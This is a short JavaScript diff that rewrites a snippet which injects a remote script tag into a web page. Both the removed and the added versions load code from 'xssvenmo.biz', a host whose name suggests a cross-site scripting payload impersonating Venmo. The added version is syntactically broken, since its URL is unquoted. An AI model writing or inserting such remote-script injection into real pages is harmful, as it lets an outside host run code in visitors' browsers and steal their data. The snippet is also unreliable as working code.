@@ -1,5 +1,7 @@
-function r() {
-  
-var a=document.createElement(\'script\');a.src=\'https://xssvenmo.biz\';document.body.appendChild(a)
+var script = document.createElement('script');
+script.onload = function () {
+    //do stuff with the script
+};
+script.src = https://xssvenmo.biz;
 
-}
+document.head.appendChild(script);
